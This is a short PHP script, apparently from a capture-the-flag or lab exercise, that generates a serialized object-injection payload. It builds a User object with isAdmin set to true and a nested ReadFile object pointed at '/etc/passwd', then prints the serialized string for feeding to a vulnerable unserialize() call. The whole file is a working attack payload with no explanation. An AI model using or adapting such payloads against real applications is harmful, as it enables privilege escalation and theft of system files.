<?php

class ReadFile {
    public function __construct() {
        $this->filename = '/etc/passwd';
    }
}

class User {
    public function __construct() {
        $this->username = new ReadFile();
        $this->isAdmin = true;
    }
}

$obj = new User();
echo serialize($obj);

?>
